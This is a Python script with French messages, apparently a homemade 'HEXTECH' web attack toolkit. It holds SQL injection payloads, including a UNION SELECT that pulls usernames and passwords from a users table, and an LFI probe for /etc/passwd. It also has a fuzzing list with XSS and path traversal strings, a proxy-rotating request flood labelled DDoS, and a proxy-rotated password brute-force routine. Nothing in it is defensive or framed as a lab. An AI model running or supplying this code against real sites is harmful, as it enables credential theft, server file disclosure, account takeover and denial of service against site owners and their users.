import requests
from itertools import product
from termcolor import colored
import random
import socket
import time

# Liste de proxies à utiliser
PROXY_LIST = ['http://proxy1', 'http://proxy2', 'http://proxy3']

def get_random_proxy():
    return random.choice(PROXY_LIST)

def detect_vulnerability(url):
    print(colored("[🦠] Analyse de vulnérabilités🦠 en cours...", "yellow"))
    payload = "' OR '1'='1"  # Exemple de payload pour test
    try:
        response = requests.get(url, params={"test": payload}, timeout=10)
        if payload in response.text:
            print(colored("[HEXTECH] Vulnérabilité détectée avec le payload!", "green"))
            return True
        else:
            print(colored("[RAPPORT HEXTECH ☣️] Aucune vulnérabilité détectée.", "red"))
            return False
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'analyse : {e}", "red"))
        return False

def get_cookies(url):
    print(colored("[*] Récupération des cookies en cours...", "yellow"))
    try:
        response = requests.get(url, timeout=10)
        cookies = response.cookies.get_dict()
        if cookies:
            print(colored(f"[+] Cookies récupérés : {cookies}", "green"))
            return cookies
        else:
            print(colored("[-] Aucun cookie trouvé.", "red"))
            return None
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de la récupération des cookies : {e}", "red"))
        return None

def lfi_test(url, file_path="/etc/passwd"):
    print(colored("[*] Test LFI en cours...", "yellow"))
    try:
        response = requests.get(url, params={"file": file_path}, timeout=10)
        if response.status_code == 200 and "root:" in response.text:
            print(colored(f"[+] Inclusion réussie avec le fichier : {file_path}", "green"))
            return response.text[:500]  # Limiter l'affichage
        else:
            print(colored("[-] Inclusion échouée.", "red"))
            return None
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors du test LFI : {e}", "red"))
        return None

def advanced_sql_injection_test(url):
    print(colored("[*] Lancement du test d'injection SQL avancée...", "yellow"))
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL, NULL --", 
        "' AND 1=2 --", 
        "' OR 'x'='x' --"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'search': payload}, timeout=10)
            if "Welcome" in response.text:
                print(f"[+] Injection réussie avec le payload: {payload}")
                extract_passwords(url)  # Extraction des mots de passe si l'injection est réussie
            else:
                print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors de l'injection SQL : {e}", "red"))

def extract_passwords(url):
    print(colored("[*] Tentative d'extraction des mots de passe...", "yellow"))
    payload = "' UNION SELECT username, password FROM users --"
    try:
        response = requests.get(url, params={'search': payload}, timeout=10)
        if response.status_code == 200:
            # Suppose que la page contient les mots de passe dans le texte
            if "username" in response.text and "password" in response.text:
                print(colored("[+] Mots de passe extraits avec succès!", "green"))
                print(f"[+] Résultat de l'extraction: {response.text[:500]}")  # Limiter l'affichage
            else:
                print(colored("[-] Aucun mot de passe trouvé.", "red"))
        else:
            print(colored(f"[-] Extraction échouée avec le payload: {payload}", "red"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'extraction des mots de passe : {e}", "red"))

def fuzzing_attack(url):
    print(colored("[*] Lancement de l'attaque de fuzzing...", "yellow"))
    fuzz_data = [
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "../etc/passwd", 
        "admin' OR 1=1 --"
    ]
    for data in fuzz_data:
        try:
            response = requests.get(url, params={"input": data}, timeout=10)
            print(f"Test de fuzzing avec : {data} - Statut : {response.status_code}")
            if response.status_code == 200:
                print(colored(f"[+] Fuzzing réussi avec : {data}", "green"))
                if "' OR 1=1 --" in data:  # Si c'est une injection SQL
                    extract_passwords(url)  # Appel pour extraire les mots de passe
            else:
                print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors du fuzzing : {e}", "red"))

# Nouvelle fonction ajoutée pour effectuer une attaque DDoS avec des proxies
def ddos_attack_with_proxies(url):
    print(colored("[*] Lancement de l'attaque DDoS avec des proxies...", "yellow"))
    try:
        for _ in range(100):  # Attaque DDoS avec 100 requêtes
            proxy = get_random_proxy()
            print(f"[+] Utilisation du proxy : {proxy}")
            response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=10)
            print(f"Statut de la requête avec {proxy} : {response.status_code}")
            time.sleep(0.1)  # Petit délai entre chaque requête pour éviter une surcharge immédiate
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))

# Nouvelle fonction ajoutée pour l'attaque par force brute avec des proxies
def bruteforce_attack_with_proxies(url, username, password_list):
    print(colored("[*] Lancement de l'attaque par force brute avec des proxies...", "yellow"))
    for password in password_list:
        proxy = get_random_proxy()
        print(f"[+] Tentative avec le proxy : {proxy} et mot de passe : {password}")
        try:
            response = requests.post(url, data={"username": username, "password": password}, proxies={"http": proxy, "https": proxy}, timeout=10)
            if "Login successful" in response.text:
                print(colored(f"[+] Attaque réussie avec le mot de passe : {password}", "green"))
                break
            else:
                print(f"[-] Tentative échouée avec le mot de passe : {password}")
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors de l'attaque brute : {e}", "red"))
